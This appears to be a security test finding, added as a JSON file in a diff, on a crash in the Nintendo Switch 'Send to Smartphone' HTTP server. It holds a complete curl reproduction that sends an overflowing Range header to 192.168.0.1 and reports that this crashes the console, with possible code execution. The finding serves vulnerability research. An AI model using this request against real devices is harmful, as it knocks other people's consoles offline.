@@ -1,0 +1,28 @@
+{
+  "test": "lp2p_http_range_overflow",
+  "timestamp": "2026-11-24T04:25:00+00:00",
+  "finding": "CRASH - Switch requested restart",
+  "trigger": "Range: bytes=0-99999999999999999999",
+  "target": "192.168.0.1 lp2p HTTP server (Send to Smartphone)",
+  "endpoint": "GET /data.json",
+  "analysis": {
+    "value": "99999999999999999999 (~10^20)",
+    "uint64_max": "18446744073709551615 (~1.8*10^19)",
+    "uint32_max": "4294967295 (~4.3*10^9)",
+    "overflow_type": "Integer overflow in Range header end-byte parsing",
+    "result": "HTTP 000 (connection dropped) + Switch crash requiring restart"
+  },
+  "reproduction": {
+    "prereq": "Connect to Switch Send to Smartphone AP",
+    "command": "curl -H 'Range: bytes=0-99999999999999999999' http://192.168.0.1/data.json",
+    "expected": "Switch crashes, asks user to restart"
+  },
+  "severity": "HIGH - crash from network input, potential code execution",
+  "other_range_tests": {
+    "bytes=0-100": "206 OK (101B)",
+    "bytes=0-999999": "206 OK (117B)", 
+    "bytes=-1": "206 OK (1B)",
+    "bytes=0-0,...multipart": "206 OK (1151B multipart)",
+    "bytes=0-99999999999999999999": "000 CONNECTION DROPPED + CRASH"
+  }
+}
